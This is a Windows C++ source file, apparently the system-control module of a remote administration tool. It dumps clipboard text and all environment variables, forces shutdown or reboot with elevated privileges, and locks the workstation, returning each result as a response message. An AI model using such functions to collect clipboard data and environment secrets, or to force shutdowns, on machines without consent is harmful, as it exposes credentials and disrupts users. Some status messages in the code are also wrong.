#include "modules/syscontrol.hpp"

void privilege() {
    HANDLE token;
    TOKEN_PRIVILEGES privileges;
    
    // Enable shutdown privileges
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(token, FALSE, &privileges, 0, NULL, NULL);
        CloseHandle(token);
    }
}

std::string gsystem::control::dump_clipboard(std::string key) {
    if (!OpenClipboard(nullptr)) return com::make_response("info", "");

    HANDLE hData = GetClipboardData(CF_TEXT);

    if (hData == nullptr) {
        CloseClipboard();
        return com::make_response("info", "");
    }

    char* pszText = static_cast<char*>(GlobalLock(hData));

    if (pszText == nullptr) {
        CloseClipboard();
        return com::make_response("info", "");
    }

    std::string text(pszText);
    GlobalUnlock(hData);
    CloseClipboard();

    return com::make_response("info", text);
}

std::string gsystem::control::read_env(std::string key) {
    const char* value = std::getenv(key.c_str());
    return com::make_response(value ? "info" : "error", value ? value : "<unknown>");
}

std::string gsystem::control::read_all_env() {
    picojson::object result;

    LPWCH env_strings = GetEnvironmentStringsW();

    if (!env_strings) {
        return com::make_response("error", "failed to get environment strings.");
    }

    LPWCH var = env_strings;

    while (*var) {
        std::wstring wentry(var);
        size_t pos = wentry.find(L'=');
        if (pos != std::wstring::npos && pos > 0) {
            std::wstring wkey = wentry.substr(0, pos);
            std::wstring wval = wentry.substr(pos + 1);
            std::string key(wkey.begin(), wkey.end());
            std::string val(wval.begin(), wval.end());
            result[key] = picojson::value(val);
        }
        var += wcslen(var) + 1;
    }

    FreeEnvironmentStringsW(env_strings);

    return com::make_response("info", picojson::value(result).serialize());

}


std::string gsystem::control::reboot(unsigned int timeout) {
    return gsystem::control::shutdown(timeout, true);
}

std::string gsystem::control::shutdown(unsigned int timeout) {
    return gsystem::control::shutdown(timeout, false);
}

std::string gsystem::control::shutdown(unsigned int timeout, bool reboot) {
    privilege();

    // If the function succeeds, the return value is nonzero.
    if (InitiateSystemShutdownA(
        NULL,  // network, in this case shutdown the local computer
        NULL, // display message
        timeout,   // delay sec
        TRUE, // applications with unsaved changes are to be forcibly closed
        reboot  // restart the computer if set to true 
    )) {
        return com::make_response("info", "shutdown/reboot scheduled in " + std::to_string(timeout) + "sec.");
    } else {
        return com::make_response("error", "?");
    }
}

std::string gsystem::control::abort_shutdown_reboot() {
    //If the function succeeds, the return value is nonzero.
    privilege();

    if(!AbortSystemShutdownA(NULL)) {
        return com::make_response("error", "?");
    }

    return com::make_response("error", "shutdown/reboot aborted.");
}


std::string gsystem::control::lock_workstation(unsigned int timeout) {
    Sleep(timeout);

    if(!LockWorkStation()) {
        return com::make_response("error", "?");
    }
    return com::make_response("info", "computer locked.");
}
